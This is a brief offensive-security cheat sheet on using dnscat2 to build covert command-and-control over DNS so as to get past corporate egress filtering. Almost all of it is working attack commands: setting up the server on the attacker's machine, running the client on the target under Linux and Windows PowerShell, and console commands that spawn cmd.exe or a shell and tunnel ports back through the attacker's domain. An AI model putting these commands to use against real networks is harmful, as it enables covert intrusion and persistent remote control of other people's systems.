# 08.02 dnscat2

> DNS-based covert C2 / tunneling — bypasses egress filtering that allows DNS but blocks everything else.

## Overview

dnscat2 uses DNS queries (TXT or MX records) to tunnel arbitrary data. Useful when the target has restrictive egress that only allows DNS lookups. Slow (DNS overhead) but it works through corporate firewalls. Pair with the right DNS infrastructure: register a domain, point NS to your dnscat2 server.

## Steps

- **Step 1** - Register a domain you control.
- **Step 2** - Set NS records to point at your dnscat2 server.
- **Step 3** - Run dnscat2 server on attacker.
- **Step 4** - Run dnscat2 client on target with your domain.

## Commands

### Install server

```bash
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server
gem install bundler
bundle install
```

### Get client binary

```bash
wget https://github.com/lukebaggett/dnscat2-powershell/releases/latest
# Or compile from source
cd dnscat2/client && make
```

### Start server (attacker)

```bash
sudo ruby ./dnscat2.rb <YOUR-DOMAIN>
```

### Connect from target — Linux

```bash
./dnscat <YOUR-DOMAIN>
```

### Connect from target — Windows PowerShell

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -Domain <YOUR-DOMAIN>
```

### In dnscat2 server console

```text
dnscat2> windows               # list sessions
dnscat2> window -i <ID>        # interact
command session> exec cmd.exe   # spawn shell session
command session> shell          # spawn shell
command session> tunnel 80     # tunnel port
```
